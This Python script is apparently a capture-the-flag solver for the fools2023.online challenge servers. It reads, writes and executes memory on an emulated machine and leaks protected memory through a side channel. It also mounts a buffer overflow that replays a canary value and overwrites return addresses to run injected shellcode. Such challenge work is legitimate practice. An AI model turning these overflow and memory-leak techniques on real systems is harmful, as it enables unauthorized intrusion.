# pylint: disable=global-statement,invalid-name,wildcard-import,unused-wildcard-import,pointless-string-statement
import sys
import socket
import select
import re
from assemble import assemble_inline, assemble_file
from utils import *

con = socket.socket(socket.AF_INET, socket.SOCK_STREAM)


class ConnectionClosedException(Exception):
    pass


def connect():
    global con
    if con:
        con.close()
    con = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    con.connect(("fools2023.online", 13337))
    read_all_poss(timeout=3)


echoing = True


def read_all_poss(timeout=3, subsequent_timeout=2, expected_end="Ready.\n> ", return_bytes=False):
    if expected_end is None:
        expected_end = "Ready.\n> "
    global con
    if not con:
        raise ConnectionClosedException("Connection closed")
    out = ""
    if return_bytes:
        out = b""
        expected_end = bytes(expected_end, "utf8")
    while True:
        ready_read, _ready_write, in_err = select.select([con], [], [con], timeout)
        if in_err:
            raise ConnectionClosedException("Socket error when reading", in_err)
        if ready_read:
            rcvd_chunk = con.recv(1024)
            if rcvd_chunk == b'':  # eof
                con = None
                raise ConnectionClosedException("EOF", out)
            if return_bytes:
                out += rcvd_chunk
            else:
                rcvd_str = rcvd_chunk.decode('utf8', 'replace')
                if echoing:
                    print(rcvd_str, end="")
                out += rcvd_str
            if out.endswith(expected_end):
                break
        else:
            break
        timeout = subsequent_timeout
    return out


connect()


def send(msg, timeout=None, expected_end=None, return_bytes=False):
    if timeout == None:
        timeout = 10
    if not con:
        raise ConnectionClosedException()
    if isinstance(msg, str):
        msg = bytes(msg, "utf8")
    assert isinstance(msg, bytes)
    if msg[-1] != b'\n'[0]:
        print("Warning: Non-terminated msg", msg)
    tot_sent = 0
    while tot_sent < len(msg):
        sent = con.send(msg[tot_sent:])
        if sent == 0:
            raise ConnectionClosedException("Socket error when writing", con)
        tot_sent += sent
    if echoing:
        print(msg.decode("utf8", errors="replace"), end="")
    return read_all_poss(timeout=timeout, subsequent_timeout=timeout, expected_end=expected_end, return_bytes=return_bytes)


def expect_prompt_and_ready_suffix(prompt, res):
    res = expect_prompt(prompt, res)
    suffix = "Ready.\n> "
    if not res.endswith(suffix):
        raise Exception("Expected ready suffix", res)
    res = res[:-len(suffix)]
    return res


def expect_prompt(prompt, res):
    if not res.startswith(prompt):
        raise Exception("Expected prompt", prompt, res)
    res = res[len(prompt):]
    return res


def read_mem_raw(addr, lines=5):
    raw = send(f"r\n{tohex(addr)}\n{tohex(lines)}\n")
    raw = expect_prompt_and_ready_suffix("> Which address? > How many lines? ", raw)
    return raw.splitlines()


def read_mem(addr, lines=None, nbytes=None, print_dump=None):
    if lines is not None and nbytes is not None:
        raise Exception("Don't use both lines and nbytes")
    if nbytes is not None:
        if print_dump is None:
            print_dump = False
        lines = (nbytes-1) // 8 + 1
    else:
        if lines is None:
            lines = 5
        if print_dump is None:
            print_dump = True
        if nbytes is None:
            nbytes = lines*8

    assert lines is not None and nbytes is not None

    raw = read_mem_raw(addr, lines)
    out = bytes_from_dump(raw)[:nbytes]
    dump = bytes_to_dump(out, addr)
    if print_dump:
        print()
        print(dump)

    return bytes(out)


def print_mem(addr):
    res = send(f"p\n{tohex(addr)}\n")
    res = expect_prompt_and_ready_suffix("> Which address? ", res)
    return res


def write_mem(addr, data):
    data = tohex(data)
    data_ = ""
    for i, c in enumerate(data):
        data_ += c
        if i % 64 == 0:
            data_ += "\n"
    res = send(f"w\n{tohex(addr)}\n{data_}.\n")
    res = expect_prompt_and_ready_suffix('> Which address? > Enter hex data. End with dot "." + newline:\n', res)
    assert res == "Loaded.\n", res


def clear_mem(addr, num=0x100):
    write_mem(addr, "00"*num)


def exec_mem(addr, timeout=None, return_bytes=False):
    res = send(f"x\n{tohex(addr)}\ny\n", timeout, return_bytes=return_bytes)
    expected = f"> Which address? > Really exec at {tohex(addr, padding=4)}? Type Y if so:"
    if return_bytes:
        expected = bytes(expected, "utf8")
    res = expect_prompt(expected, res)
    return res


def exec_data(code, addr=0x2000, timeout=None, return_bytes=True):
    write_mem(addr, code)
    return exec_mem(addr, timeout, return_bytes=return_bytes)


def exec_asm(code, addr=0x2000, timeout=None, return_bytes=True):
    return exec_data(assemble_inline(code, addr), addr, timeout, return_bytes=return_bytes)


file_data = """
BLK  SIZE  NAME
=======================
07   01F9  TODO.TXT
08   0560  REPORT03.PRG
0A   02B1  MATHTEST.PRG
01   0035  FLAG.TXT
"""


def filesize(filename):
    for rec in file_data.splitlines()[3:]:
        _blk, size, name = rec.split()
        if name == filename:
            return fromhex(size)
    # return 0x0300
    raise Exception("File not found", filename)


def read_file_to_mem(filename, addr=0x2000):
    _size = filesize(filename)
    res = send(f"rf\n{filename}\n{tohex(addr)}\n")
    res = expect_prompt_and_ready_suffix("> Filename? > Which address? ", res)
    assert res == "Loaded.\n", res


def read_file(filename, addr=0x2000, print_dump=True):
    read_file_to_mem(filename, addr)
    return read_mem(addr, nbytes=filesize(filename), print_dump=print_dump)


def print_file(filename, addr=0x2000):
    read_file_to_mem(filename, addr)
    return print_mem(addr)


def exec_file(filename, addr=0x2000):
    read_file_to_mem(filename, addr)
    return exec_mem(addr)


def test_comparisons(code, addr=0x2000):
    for pre, msg in ("10beefa2beef", "LHS=RHS"), ("10beefa2beee", "LHS>RHS"), ("10beefa2befe", "LHS<RHS"):
        print(f"\n\n{msg}\n")
        exec_data(pre+code, addr)


def connect_server3():
    global con
    if con:
        con.close()
    con = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    con.connect(("fools2023.online", 13339))
    read_all_poss(timeout=3, expected_end="(max 15 characters): ")


def bytes_(x):
    if isinstance(x, str):
        return bytes(x, "utf8")
    else:
        return bytes(x)


def send_serv3(msg, timeout=3):
    try:
        return send(msg, expected_end=" to leave: ", timeout=timeout)
    except ConnectionClosedException as e:
        if len(e.args) >= 2 and e.args[0] == "EOF":
            return e.args[1]
    return ""


def connect_serv3_with_name(name, cmd="q"):
    connect_server3()
    out = ""
    out += send_serv3(bytes_(name) + b"\n")
    if cmd:
        out += send_serv3(cmd + "\n")
    return out


def read_serv3_mem(base_addr, cmd="q"):  # this doesn't work with addresses with 0x0A (newline) in them
    name = []
    for i in range(4):
        name.append(0xF0)
        addr = base_addr + i*2
        name += to_le(addr)

    resp = connect_serv3_with_name(name, cmd)

    resp_name = re.findall(r"Welcome, (.{16})", resp)[0]

    out = []

    for mem in chunks(resp_name, 4):
        out += to_le(fromhex(mem))

    return out


def connect_serv3_with_corruption_check():
    return bytes(read_serv3_mem(0xFE00, cmd="1")[:4])


mem_rand_backup = 0xfe00
mem_input_buf = 0xf753
stack = 0xff00


def connect_serv3_corrupt(payload, payload_addr=mem_input_buf, expected_end="E"):
    assert isinstance(payload, bytes)
    assert payload_addr >= mem_input_buf
    if b'\n' in payload:
        raise Exception("No newlines pls")

    out = b""
    out += b"A"*(payload_addr-mem_input_buf)
    out += payload
    addr = mem_input_buf + len(out)
    assert addr <= mem_rand_backup, "Payload too big"

    out += b"B" * (mem_rand_backup-addr)
    corrupt_check = b"\n"
    while b"\n" in corrupt_check:
        corrupt_check = connect_serv3_with_corruption_check()
    out += corrupt_check

    addr = mem_input_buf + len(out)
    out += b"C" * (stack-0x10-addr)
    addr_bytes = bytes([payload_addr % 256, payload_addr//256])
    out += addr_bytes * 0x14
    out += b"DDDD\n"

    return send(out, timeout=10, expected_end=expected_end)


def connect_serv3_with_console():
    payload_addr = 0xfc00
    payload = bytes(assemble_file("payload.prg", payload_addr))
    console = bytes(open("console.bin", "rb").read())

    connect_serv3_corrupt(payload, payload_addr)
    send(console + b"\n")


def read_protected_mem(n):
    result = exec_asm(" ld R2 "+str(n)+" / cmp R2 $0 / jp 0x47 / brk / .lab: dw 0x4948 / dw 0x49F0 / dw 0x6565 / dw 0")[:6]
    if result.endswith(b"Ready"):
        return 0
    elif result.endswith(b"Read"):
        return result[1]
    elif result.endswith(b"R"):
        return 0xf0
    # elif result.endswith(b"Re"):#these are probably wrong
    #    return 0xf
    elif result.endswith(b"Rea"):
        return 0xf1
    raise(Exception("unrecognised pattern"+repr(result)))


def read_protected_block(addr, ln):
    return [read_protected_mem(i) for i in range(addr, addr+ln)]


def dump_protected_mem(file=sys.stdout):
    ll = []
    for i in range(0, 0x1000, 0x10):
        b = read_protected_block(i, 0x10)
        print(bytes_to_dump(b, i), file=file, end="")
        ll.append(b)
    return ll


"""
doesn't work because of 0s'
def read_protected_mem_block(addr,ln):
    assert(ln>0)
    result = exec_asm(f" ld R3 {ln} / ld R2 {addr} /  loop: push R3 / push R2 / call 0x47 / pop R2 / pop R3 / inc R2 / dec R3 / cmp R3 $0 / jp ne loop / ret / brk ")
    if result.startswith(b" "):
        result=result[1:]
    if result.endswith(b"Ready.\n> "):
        result = result[:-len(b"Ready.\n> ")]
    return result
"""


def read_block(blk):
    exec_asm(f"ld R0 {blk} / ld R1 $3000 / int $04 / ret", return_bytes=False)
    return read_mem(0x3000, nbytes=0x400)


def dump_all_blocks(dirname, confn=connect):
    for i in range(256):
        print(tohex(i))
        try:
            blk = read_block(i)
            dump = bytes_to_dump(blk, 0x3000)
            if any(b for b in blk):
                with open(f"{dirname}/{tohex(i)}.dmp", "w") as f:
                    f.write(dump)
        except ConnectionClosedException:
            confn()
